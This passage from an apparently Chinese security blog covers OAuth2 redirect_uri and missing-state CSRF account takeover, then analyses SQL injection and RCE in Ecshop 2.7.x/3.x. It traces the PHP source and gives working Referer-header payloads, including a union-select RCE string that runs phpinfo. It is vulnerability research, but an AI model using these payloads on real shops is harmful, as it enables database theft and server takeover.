+<h3 id="案例-第三方帐号快捷登录授权劫持漏洞"><a href="#案例-第三方帐号快捷登录授权劫持漏洞" class="headerlink" title="案例-第三方帐号快捷登录授权劫持漏洞"></a>案例-第三方帐号快捷登录授权劫持漏洞</h3><p>修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。</p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>KEY：<a href="https://gh0st.cn/archives/2018-02-12/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-02-12/1</a></p>
+<h2 id="无state导致CSRF产生的账户接管"><a href="#无state导致CSRF产生的账户接管" class="headerlink" title="无state导致CSRF产生的账户接管"></a>无state导致CSRF产生的账户接管</h2><p>用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。</p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>拿绑定QQ为例子。</p>
+<p>一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF<br><img src="https://i.loli.net/2019/02/14/5c64d712f1b50.png" alt></p>
+<h3 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h3><p>OAuth2.0忽略state参数引发的CSRF漏洞：<a href="https://blog.csdn.net/gjb724332682/article/details/54428808" target="_blank" rel="noopener">https://blog.csdn.net/gjb724332682/article/details/54428808</a></p>
+<p>Oauth配置错误导致的账户接管：<a href="https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/02/14/Oauth2的两类漏洞挖掘/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/02/02/Echsop2.7.x几处漏洞分析/"> 
+                    Echsop2.7.x几处漏洞分析 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-02-02   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="Echsop2-7-x几处漏洞分析"><a href="#Echsop2-7-x几处漏洞分析" class="headerlink" title="Echsop2.7.x几处漏洞分析"></a>Echsop2.7.x几处漏洞分析</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这些洞是在半年前公布的细节，当时没来得及关注。最近在给自己定目标，决定重新刷一遍这些洞。</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>由于未对Reffer内容进行过滤而造成的SQL注入</p>
+<p>漏洞位置user.php:302</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">elseif ($action == &apos;login&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($back_act) &amp;&amp; isset($GLOBALS[&apos;_SERVER&apos;][&apos;HTTP_REFERER&apos;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[&apos;_SERVER&apos;][&apos;HTTP_REFERER&apos;], &apos;user.php&apos;) ? &apos;./index.php&apos; : $GLOBALS[&apos;_SERVER&apos;][&apos;HTTP_REFERER&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = &apos;user.php&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(&apos;back_act&apos;, $back_act);</span><br><span class="line">    $smarty-&gt;display(&apos;user_passport.dwt&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$back_act可控为Reffer值，跟进assign</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 注册变量</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   mix      $tpl_var</span><br><span class="line"> * @param   mix      $value</span><br><span class="line"> *</span><br><span class="line"> * @return  void</span><br><span class="line"> */</span><br><span class="line">function assign($tpl_var, $value = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_array($tpl_var))</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($tpl_var AS $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            if ($key != &apos;&apos;)</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;_var[$key] = $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        if ($tpl_var != &apos;&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_var[$tpl_var] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>assign()注册了模板变量$this-&gt;_var[‘back_act’]，这里注册的变量在后面的页面模板编译中会用到</p>
+<p>继续跟进user的display函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 显示页面函数</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   string      $filename</span><br><span class="line"> * @param   sting      $cache_id</span><br><span class="line"> *</span><br><span class="line"> * @return  void</span><br><span class="line"> */</span><br><span class="line">function display($filename, $cache_id = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">    $out = $this-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">    if (strpos($out, $this-&gt;_echash) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = explode($this-&gt;_echash, $out);</span><br><span class="line">        foreach ($k AS $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            if (($key % 2) == 1)</span><br><span class="line">            &#123;</span><br><span class="line">                $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $out = implode(&apos;&apos;, $k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Display中调用fetch函数处理模板文件：user_passport.dwt，跟进关键代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 处理模板文件</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   string      $filename</span><br><span class="line"> * @param   sting      $cache_id</span><br><span class="line"> *</span><br><span class="line"> * @return  sring</span><br><span class="line"> */</span><br><span class="line">function fetch($filename, $cache_id = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    $out = $this-&gt;make_compiled($filename);</span><br><span class="line">    ...</span><br><span class="line">    return $out; // 返回html数据</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$filename就是user_passport.dwt，关键内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;act_login&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;back_act&quot; value=&quot;&#123;$back_act&#125;&quot; /&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;&#123;$lang.confirm_login&#125;&quot; /&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过make_compiled函数编译模板文件，编译时会把之前注册的模板变量渲染到{$back_act}。$out即为渲染后的html代码块</p>
+<p>继续跟进流程，回到display。$out内容被分割为两部分，分割依据是$this-&gt;_echash，而$this-&gt;_echash参数值固定<br><img src="https://i.loli.net/2019/02/01/5c546878d638b.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$k = explode($this-&gt;_echash, $out);</span><br><span class="line">foreach ($k AS $key =&gt; $val)</span><br><span class="line">&#123;</span><br><span class="line">    if (($key % 2) == 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进insert_mod</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function insert_mod($name) // 处理动态内容</span><br><span class="line">&#123;</span><br><span class="line">    list($fun, $para) = explode(&apos;|&apos;, $name);</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = &apos;insert_&apos; . $fun;</span><br><span class="line"></span><br><span class="line">    return $fun($para);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续对$out内容以“|”形式分割成$fun、$para，|后的内容进行反序列化，再动态调用$fun函数。至此，函数名$fun可控，函数内容$para可控，找一个以Insert_开头的可利用的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    static $static_res = NULL;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; .</span><br><span class="line">                    &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; .</span><br><span class="line">                &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;.</span><br><span class="line">                &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; .</span><br><span class="line">                &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;.</span><br><span class="line">                    &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; .</span><br><span class="line">                &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;];</span><br><span class="line">        $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>触发SQL注入，构造的PAYLOAD形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echash+ads|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</span><br></pre></td></tr></table></figure>
+
+<p>创宇提供的一个payload示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>采用limit注入，利用procedure analyse函数。具体见P师傅文章：<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
+<h1 id="RCE分析"><a href="#RCE分析" class="headerlink" title="RCE分析"></a>RCE分析</h1><p>RCE利用点还是insert_ads函数，参数的处理流程很大一部分是上文SQL注入的流程，这里分析3.x版本的RCE</p>
+<p>继续跟进ads函数，重点部分代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($res AS $row)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;])</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[&apos;position_style&apos;];</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $position_style = &apos;str:&apos; . $position_style;</span><br><span class="line">    $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads);</span><br><span class="line">    $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$res为查询结果，即$row[‘position_id’]可用SQL注入的Union select控制，$arr[‘id’]也可控，当两者相等时$position_style的值就可控为$row[‘position_style’]。接着又调用assgin注册变量、fetch编译模板。再看fetch函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * 处理模板文件</span><br><span class="line">     *</span><br><span class="line">     * @access  public</span><br><span class="line">     * @param   string      $filename</span><br><span class="line">     * @param   sting      $cache_id</span><br><span class="line">     *</span><br><span class="line">     * @return  sring</span><br><span class="line">     */</span><br><span class="line">function fetch($filename, $cache_id = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (strncmp($filename,&apos;str:&apos;, 4) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">         ......</span><br></pre></td></tr></table></figure>
+
+<p>由于字符串前被拼接了str:，所以进入$this-&gt;_eval函数处理，这也是最终的漏洞触发点，可以eval我们构造的恶意语句。<br><img src="https://i.loli.net/2019/02/01/5c5468790d352.png" alt></p>
+<p>但是再_eval之前经过fetch_str处理字符串，跟进</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 处理字符串函数</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   string     $source</span><br><span class="line"> *</span><br><span class="line"> * @return  sring</span><br><span class="line"> */</span><br><span class="line">function fetch_str($source)</span><br><span class="line">&#123;</span><br><span class="line">    if (!defined(&apos;ECS_ADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        $source = $this-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">    &#125;</span><br><span class="line">    $source=preg_replace(&quot;/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;, &quot;&quot;, $source);</span><br><span class="line">    if(preg_match_all(&apos;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&apos;]?php[\&quot;\&apos;]?)~is&apos;, $source, $sp_match))</span><br><span class="line">    &#123;</span><br><span class="line">        $sp_match[1] = array_unique($sp_match[1]);</span><br><span class="line">        for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">            $source = str_replace($sp_match[1][$curr_sp],&apos;%%%SMARTYSP&apos;.$curr_sp.&apos;%%%&apos;,$source);</span><br><span class="line">        &#125;</span><br><span class="line">         for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">        &#123;</span><br><span class="line">             $source= str_replace(&apos;%%%SMARTYSP&apos;.$curr_sp.&apos;%%%&apos;, &apos;&lt;?php echo \&apos;&apos;.str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, $sp_match[1][$curr_sp]).&apos;\&apos;; ?&gt;&apos;.&quot;\n&quot;, $source);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return preg_replace(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;, &quot;\$this-&gt;select(&apos;\\1&apos;);&quot;, $source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个正则会匹配危险的字符串函数，重点在最后一个正则。\\1是替代表达，匹配到的字符串会替代\\1的位置。</p>
+<p>eg:<code>return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, &quot;xxx{abc}xxx&quot;);</code>结果就是<code>return $this-&gt;select(&#39;{abc}&#39;)</code></p>
+<p>跟进select函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 处理&#123;&#125;标签</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   string      $tag</span><br><span class="line"> *</span><br><span class="line"> * @return  sring</span><br><span class="line"> */</span><br><span class="line">function select($tag)</span><br><span class="line">&#123;</span><br><span class="line">    $tag = stripslashes(trim($tag));</span><br><span class="line"></span><br><span class="line">    if (empty($tag))</span><br><span class="line">    &#123;</span><br><span class="line">        return &apos;&#123;&#125;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    elseif ($tag&#123;0&#125; == &apos;*&apos; &amp;&amp; substr($tag, -1) == &apos;*&apos;) // 注释部分</span><br><span class="line">    &#123;</span><br><span class="line">        return &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    elseif ($tag&#123;0&#125; == &apos;$&apos;) // 变量</span><br><span class="line">    &#123;</span><br><span class="line">//            if(strpos($tag,&quot;&apos;&quot;) || strpos($tag,&quot;]&quot;))</span><br><span class="line">//            &#123;</span><br><span class="line">//                 return &apos;&apos;;</span><br><span class="line">//            &#125;</span><br><span class="line">        return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
+
+<p>trim处理了字符串两边的{}，最后返回一段php标签下的字符串，如果成功返回，则之前的eval就可以执行这段php字符串。不过这个值的获取取决于get_val，跟进get_val</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 处理smarty标签中的变量标签</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   string     $val</span><br><span class="line"> *</span><br><span class="line"> * @return  bool</span><br><span class="line"> */</span><br><span class="line">function get_val($val)</span><br><span class="line">&#123;</span><br><span class="line">    if (strrpos($val, &apos;[&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        $val = preg_replace(&quot;/\[([^\[\]]*)\]/eis&quot;, &quot;&apos;.&apos;.str_replace(&apos;$&apos;,&apos;\$&apos;,&apos;\\1&apos;)&quot;, $val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strrpos($val, &apos;|&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        $moddb = explode(&apos;|&apos;, $val);</span><br><span class="line">        $val = array_shift($moddb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (empty($val))</span><br><span class="line">    &#123;</span><br><span class="line">        return &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strpos($val, &apos;.$&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        $all = explode(&apos;.$&apos;, $val);</span><br><span class="line"></span><br><span class="line">        foreach ($all AS $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            $all[$key] = $key == 0 ? $this-&gt;make_var($val) : &apos;[&apos;. $this-&gt;make_var($val) . &apos;]&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $p = implode(&apos;&apos;, $all);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $p = $this-&gt;make_var($val);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>若$val不存在<code>.$</code>则进入make_var()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 处理去掉$的字符串</span><br><span class="line"> *</span><br><span class="line"> * @access  public</span><br><span class="line"> * @param   string     $val</span><br><span class="line"> *</span><br><span class="line"> * @return  bool</span><br><span class="line"> */</span><br><span class="line">function make_var($val)</span><br><span class="line">&#123;</span><br><span class="line">    if (strrpos($val, &apos;.&apos;) === false)</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = $this-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = &apos;$this-&gt;_var[\&apos;&apos; . $val . &apos;\&apos;]&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">       .....</span><br></pre></td></tr></table></figure>
+
+<p>这个make_var的$val可控，则表明返回的$p可控，最终返回的$this-&gt;get_val()就可控，也就是$this-&gt;_eval的实参可控（一段PHP标签下的字符串），从而getshell。</p>
+<p>构造Payload我用逆推的思路，逐步满足每个函数判断的条件<br><img src="https://i.loli.net/2019/02/02/5c54fa8f5fb8b.png" alt></p>
+<p>最终的POC要结合SQL注入，通过id和num参数将order by注释<br><img src="https://i.loli.net/2019/02/02/5c54fa8f75fb6.png" alt></p>
+<p>再利用union select构造指定列的值：第二列postion_id，第七列position_style<br><img src="https://images.seebug.org/content/images/2018/09/cd7f6796-c175-46c0-a7c4-9cdb480ab960.png-w331s" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure>
+
